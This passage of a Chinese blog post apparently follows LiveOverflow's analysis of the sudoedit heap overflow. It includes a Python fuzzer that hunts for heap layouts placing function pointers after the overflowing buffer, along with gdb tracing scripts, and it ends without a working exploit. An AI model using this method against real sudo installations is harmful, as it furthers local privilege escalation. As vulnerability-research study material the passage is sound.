src="https://img.joe1sn.top/uploads/big/677cba2f8962fddb6943fa56da03b8d1.png" alt="image-20220414122448875" /></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make</span><br><span class="line">ln -s /pwd/sudo_test/src/.libs/sudo ./src/.libs/sudoedit</span><br></pre></td></tr></table></figure><p>作者在这里踩了坑，我想复现下，不想看的可以略过</p><p><img src="https://img.joe1sn.top/uploads/big/4ecd2bb3d6b06eefcd140b1cbc096af3.png" alt="image-20220414123642675" /></p><p><img src="https://img.joe1sn.top/uploads/big/cc0e7e9154dd2ed5e98aae914cc289f4.png" alt="image-20220414123801800" /></p><p>虽然报错的方式不一样，但是结果和原因都是一样的。一个都是libsudo这个库找不到，作者的问题是使用的是系统变量中的库，<strong>但是这个库不含有<code>printf</code>即其他输出，自然也就没法打印字符串</strong></p><p>&gt;&gt;问题</p><ul><li><p>没有反应</p><p>找找是不是代码写的文件是其他文件的代码</p></li></ul><p>所以使用<code>make install</code>安装方法就好了，只要之前make过一次之后就都可以了</p><p><img src="https://img.joe1sn.top/uploads/big/a9391826eb45d490d44f3519b94854f8.png" alt="image-20220414212057228" /></p><p>堆溢出发生时，程序并不会立即<code>crash</code>，而是会进入到红黑树的部分，但是能溢出的<code>user_args</code>地址在<code>rbtree1</code>地址后面，所以依然无法利用</p><h2 id="暴力测试脚本"><a class="markdownIt-Anchor" href="#暴力测试脚本"></a> 暴力测试脚本</h2><p>尝试构造不同的输入，看看能不能有路径可以把函数指针放在我们能溢出的chunk后面的</p><ol><li><p>输入来源</p><ul><li>stdin</li><li>文件(files)</li><li>协议参数(arguments)</li><li>环境变量(env vars)</li></ul></li><li><p>设置长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define some common size values usable for different inputs</span></span><br><span class="line">_SIZES = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xff</span>)]</span><br><span class="line">_SIZES += [<span class="number">2</span>**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += [(<span class="number">2</span>**i)+<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += [(<span class="number">2</span>**i)-<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">15</span>)]</span><br><span class="line">_SIZES += ([<span class="number">0</span>]*<span class="number">50</span>)</span><br></pre></td></tr></table></figure></li><li><p>sudo参数协议(sudo help)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># define some flags from sudo -h</span></span><br><span class="line">ARG1 = [<span class="string">&quot;-A&quot;</span>,<span class="string">&quot;-B&quot;</span>,<span class="string">&quot;-E&quot;</span>,<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;-H&quot;</span>,<span class="string">&quot;-K&quot;</span>,<span class="string">&quot;-k&quot;</span>,<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;-n&quot;</span>,<span class="string">&quot;-P&quot;</span>,<span class="string">&quot;-S&quot;</span>,<span class="string">&quot;-s&quot;</span>]</span><br><span class="line">ARG1 += [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">ARG2 = _SIZES</span><br><span class="line">ARG3 = _SIZES</span><br><span class="line">HOSTNAME = _SIZES</span><br><span class="line">ENV = _SIZES</span><br></pre></td></tr></table></figure></li><li><p>设置测试集</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump a testcase into a logfile</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_file</span>(<span class="params">fname, lines, ptrs, arg, env, key</span>):</span><br><span class="line">    <span class="comment"># create the folders if they don&#x27;t exist</span></span><br><span class="line">    directory = os.path.dirname(fname)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</span><br><span class="line">        os.makedirs(directory)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># don&#x27;t write the dump file if it&#x27;s already too large</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(fname) <span class="keyword">and</span> Path(fname).stat().st_size &gt; <span class="number">200000</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># write to file</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fname, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;----------------------------\n&quot;</span>)</span><br><span class="line">        f.write(lines[<span class="number">1</span>].decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> key:</span><br><span class="line">            distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">            f.write(<span class="string">f&quot;user_args &lt; <span class="subst">&#123;key.decode(<span class="string">&#x27;ascii&#x27;</span>)&#125;</span>\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">f&quot;distance: 0x<span class="subst">&#123;distance:x&#125;</span>\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> key:</span><br><span class="line">            f.write(<span class="string">f&quot;0x<span class="subst">&#123;ptrs[<span class="string">b&#x27;user_args&#x27;</span>]:016x&#125;</span> &lt; 0x<span class="subst">&#123;ptrs[key]:016x&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;args: sudoedit &quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot; &quot;</span>.join(arg))</span><br><span class="line">        f.write(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> env:</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;env[k]&#125;</span>\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        f.write(lines[<span class="number">0</span>].decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        test = &#123;&#125;</span><br><span class="line">        test[<span class="string">&#x27;arg&#x27;</span>] = arg</span><br><span class="line">        test[<span class="string">&#x27;env&#x27;</span>] = env</span><br><span class="line">        f.write(json.dumps(test))</span><br><span class="line">        f.write(<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this will run sudoedit with a set of arguments and environment variables</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sudoedit</span>(<span class="params">arg, env</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------&quot;</span>)</span><br><span class="line">    <span class="comment"># disable stdout buffering with stdbuf wrapping around sudoedit</span></span><br><span class="line">    <span class="comment"># and add the commandline arguments</span></span><br><span class="line">    _cmd = [<span class="string">&quot;/usr/bin/stdbuf&quot;</span>, <span class="string">&quot;-o0&quot;</span>, <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>] + arg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># execute it</span></span><br><span class="line">    p = subprocess.Popen(_cmd, env=env, bufsize=<span class="number">0</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># send some newlines and check if we get any output</span></span><br><span class="line">        lines = p.communicate(<span class="string">b&quot;x\nx\nx\nx\n&quot;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="comment"># terminate on timeout</span></span><br><span class="line">        p.terminate()</span><br><span class="line">        lines = p.communicate()</span><br><span class="line">    <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;SEGFAULT&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># read the list of function pointers</span></span><br><span class="line">    ptrs = &#123;&#125;</span><br><span class="line">    skipping = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">0</span>].splitlines():</span><br><span class="line">        key,val = line.split(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">            skipping = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> skipping:</span><br><span class="line">            ptrs[key] = <span class="built_in">int</span>(val,<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># go through all function pointers</span></span><br><span class="line">    <span class="keyword">if</span> ptrs <span class="keyword">and</span> <span class="string">b&#x27;user_args&#x27;</span> <span class="keyword">in</span> ptrs:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> ptrs:</span><br><span class="line">            <span class="keyword">if</span> key != <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">                <span class="comment"># is our overflow buffer before a function pointer?</span></span><br><span class="line">                <span class="keyword">if</span> ptrs[<span class="string">b&#x27;user_args&#x27;</span>] &lt; ptrs[key]:</span><br><span class="line">                    distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> distance&lt;<span class="number">14000</span>:</span><br><span class="line">                        fname = <span class="string">f&#x27;<span class="subst">&#123;FOLDER&#125;</span>/<span class="subst">&#123;distance&#125;</span>&#x27;</span></span><br><span class="line">                        dump_file(fname, lines, ptrs, arg, env, key)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># did we get a segfault?</span></span><br><span class="line">                        <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">                            fname = <span class="string">f&quot;<span class="subst">&#123;FOLDER&#125;</span>/crashes/segfault_<span class="subst">&#123;distance&#125;</span>&quot;</span></span><br><span class="line">                            dump_file(fname, lines, ptrs, arg, env, <span class="literal">None</span>)</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">ALPHABET = <span class="string">&#x27;0123456789ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>fuzz主要功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fuzz loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># select random size values</span></span><br><span class="line">    arg1 = random.choice(ARG1)</span><br><span class="line">    rand_arg2_size = random.choice(ARG2)</span><br><span class="line">    rand_arg3_size = random.choice(ARG3)</span><br><span class="line">    rand_hostname_size = random.choice(HOSTNAME)</span><br><span class="line">    rand_env_size = random.choice(ENV)</span><br><span class="line">    arg = []</span><br><span class="line">    env = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># arguments</span></span><br><span class="line">    <span class="comment"># ... -s AAAAAAA\ ...</span></span><br><span class="line">    <span class="keyword">if</span> arg1:</span><br><span class="line">        arg.append(arg1)</span><br><span class="line">    arg.append(<span class="string">&quot;-s&quot;</span>)</span><br><span class="line">    arg.append(random.choice(ALPHABET)*rand_arg2_size + <span class="string">&quot;\\&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> rand_arg3_size:</span><br><span class="line">        arg.append(random.choice(ALPHABET)*rand_arg3_size)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># environment variables</span></span><br><span class="line">    <span class="keyword">if</span> rand_hostname_size:</span><br><span class="line">        env[<span class="string">&quot;HOSTNAME&quot;</span>] = random.choice(ALPHABET)*rand_hostname_size</span><br><span class="line">    <span class="keyword">if</span> rand_env_size:</span><br><span class="line">        env[random.choice(ALPHABET)*<span class="number">3</span>] = random.choice(ALPHABET)*rand_env_size</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># run sudoedit</span></span><br><span class="line">    run_sudoedit(arg, env)</span><br></pre></td></tr></table></figure></li><li><p>开始fuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will run sudoedit with a set of arguments and environment variables</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_sudoedit</span>(<span class="params">arg, env</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------------&quot;</span>)</span><br><span class="line">    <span class="comment"># disable stdout buffering with stdbuf wrapping around sudoedit</span></span><br><span class="line">    <span class="comment"># and add the commandline arguments</span></span><br><span class="line">    _cmd = [<span class="string">&quot;/usr/bin/stdbuf&quot;</span>, <span class="string">&quot;-o0&quot;</span>, <span class="string">&quot;/usr/local/bin/sudoedit&quot;</span>] + arg</span><br><span class="line"></span><br><span class="line">    <span class="comment"># execute it</span></span><br><span class="line">    p = subprocess.Popen(_cmd, env=env, bufsize=<span class="number">0</span>, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># send some newlines and check if we get any output</span></span><br><span class="line">        lines = p.communicate(<span class="string">b&quot;x\nx\nx\nx\n&quot;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="comment"># terminate on timeout</span></span><br><span class="line">        p.terminate()</span><br><span class="line">        lines = p.communicate()</span><br><span class="line">    <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;SEGFAULT&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># read the list of function pointers</span></span><br><span class="line">    ptrs = &#123;&#125;</span><br><span class="line">    skipping = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines[<span class="number">0</span>].splitlines():</span><br><span class="line">        key,val = line.split(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">            skipping = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> skipping:</span><br><span class="line">            ptrs[key] = <span class="built_in">int</span>(val,<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># go through all function pointers</span></span><br><span class="line">    <span class="keyword">if</span> ptrs <span class="keyword">and</span> <span class="string">b&#x27;user_args&#x27;</span> <span class="keyword">in</span> ptrs:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> ptrs:</span><br><span class="line">            <span class="keyword">if</span> key != <span class="string">b&#x27;user_args&#x27;</span>:</span><br><span class="line">                <span class="comment"># is our overflow buffer before a function pointer?</span></span><br><span class="line">                <span class="keyword">if</span> ptrs[<span class="string">b&#x27;user_args&#x27;</span>] &lt; ptrs[key]:</span><br><span class="line">                    distance = ptrs[key] - ptrs[<span class="string">b&#x27;user_args&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> distance&lt;<span class="number">14000</span>:</span><br><span class="line">                        fname = <span class="string">f&#x27;<span class="subst">&#123;FOLDER&#125;</span>/<span class="subst">&#123;distance&#125;</span>&#x27;</span></span><br><span class="line">                        dump_file(fname, lines, ptrs, arg, env, key)</span><br><span class="line"></span><br><span class="line">                        <span class="comment"># did we get a segfault?</span></span><br><span class="line">                        <span class="keyword">if</span> p.returncode == -<span class="number">11</span>:</span><br><span class="line">                            fname = <span class="string">f&quot;<span class="subst">&#123;FOLDER&#125;</span>/crashes/segfault_<span class="subst">&#123;distance&#125;</span>&quot;</span></span><br><span class="line">                            dump_file(fname, lines, ptrs, arg, env, <span class="literal">None</span>)</span><br><span class="line">                            <span class="keyword">return</span></span><br><span class="line">                        <span class="keyword">return</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://img.joe1sn.top/uploads/big/8415ea76e1d7d757ab5a0a2a64b55aa8.png" alt="image-20220415130840543" /></p><p>最后发现chunk位置相差太远不同 ，根本无法利用</p><h1 id="gdb工具编写"><a class="markdownIt-Anchor" href="#gdb工具编写"></a> GDB工具编写</h1><h2 id="阶段-1"><a class="markdownIt-Anchor" href="#阶段-1"></a> 阶段 1</h2><p>要改进上面的暴力脚本，就要知道我对的分配情况，我们也可以在gdb里面在每次<code>malloc</code>下断点查看<code>size</code>参数。</p><p>更为便捷的技巧是查看<code>free</code>时候的指针的地址的值，如果是我们认识的字符串，那么我们就能控制到哪里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> breakpoint pending on</span><br><span class="line"><span class="built_in">break</span> free</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> <span class="built_in">printf</span> <span class="string">&quot;free(): %s\n&quot;</span>,<span class="variable">$rdi</span></span><br><span class="line"> <span class="built_in">continue</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s <span class="string">&#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span></span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -x ./gdb.init /usr/local/bin/sudoedit  &gt; free_trace</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/087221d78d84e19ddbcfe7d6a788fbfc.png" alt="image-20220415123301007" /></p><p>发现有环境变量，再次尝试设置环境变量</p><p><img src="https://img.joe1sn.top/uploads/big/19f25365a5ccc6c30832bb70793e9ff3.png" alt="image-20220415123740168" /></p><p>发现根本没变，要是我们尝试更多的环境变量呢？</p><h2 id="阶段-2"><a class="markdownIt-Anchor" href="#阶段-2"></a> 阶段 2</h2><p>直接在加载环境变量（<code>getenv(3p)</code>）的时候下断点，看看用了那些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set breakpoint pending on</span><br><span class="line"></span><br><span class="line">break getenv</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> printf &quot;getenv(): %s\n&quot;,$rdi</span><br><span class="line"> continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span><br></pre></td></tr></table></figure><p>发现可以设置的环境变量值</p><p><img src="https://img.joe1sn.top/uploads/big/dc45f29e3991c2d964986b846b522f9c.png" alt="image-20220415124335590" /></p><p>再次改写脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">set breakpoint pending on</span><br><span class="line">set environment LOCPATH = HEAP0</span><br><span class="line">set environment LC_ALL = HEAP1</span><br><span class="line">set environment LC_IDENTIFICATION = HEAP2</span><br><span class="line">set environment LANG = HEAP3</span><br><span class="line">set environment LC_MEASUREMENT = HEAP4</span><br><span class="line">set environment LC_TELEPHONE = HEAP5</span><br><span class="line">set environment LC_ADDRESS = HEAP6</span><br><span class="line">set environment LC_NAME = HEAP7</span><br><span class="line">set environment LC_PAPER = HEAP8</span><br><span class="line">set environment LC_MESSAGES = HEAP9</span><br><span class="line">set environment LC_MONETARY = HEAPA</span><br><span class="line">set environment LC_COLLATE = HEAPB</span><br><span class="line">set environment LC_TIME = HEAPC</span><br><span class="line">set environment LC_NUMERIC = HEAPD</span><br><span class="line">set environment LC_CTYPE = HEAPE</span><br><span class="line">set environment GCONV_PATH = HEAPF</span><br><span class="line">set environment TZ = HEAPG</span><br><span class="line">set environment SHELL = HEAPI</span><br><span class="line"></span><br><span class="line">break free</span><br><span class="line">commands</span><br><span class="line"> silent</span><br><span class="line"> printf &quot;free(): %s\n&quot;,$rdi</span><br><span class="line"> continue</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">run -s &#x27;SSSSSSSSSSSSSSSSSSSSSYYY\&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/465ccd9c3a880d07af8a9a78aba2a03d.png" alt="image-20220415125938308" /></p><p>所以可以从这些地方下手来构建更好的暴力测试工具，同时作者也在第一份暴力测试工具中犯了很多错误。用github上的改进版本能快速找到能利用的点</p><p><img src="https://img.joe1sn.top/uploads/big/14cd70c46596227d77bdee90d7be5605.png" alt="image-20220415131006033" /></p><p>或许利用点在于覆写环境变量？</p><h2 id="阶段-3"><a class="markdownIt-Anchor" href="#阶段-3"></a> 阶段 3</h2><p>这时里exp还很远，也可以尝试下分析堆溢出过后还有哪些地方申请</p><p>作者直接写了一个gef的拓展工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/pwd/gef&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit</span></span><br><span class="line"></span><br><span class="line">__AUTHOR__ = <span class="string">&quot;liveoverflow&quot;</span></span><br><span class="line">__VERSION__ = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span 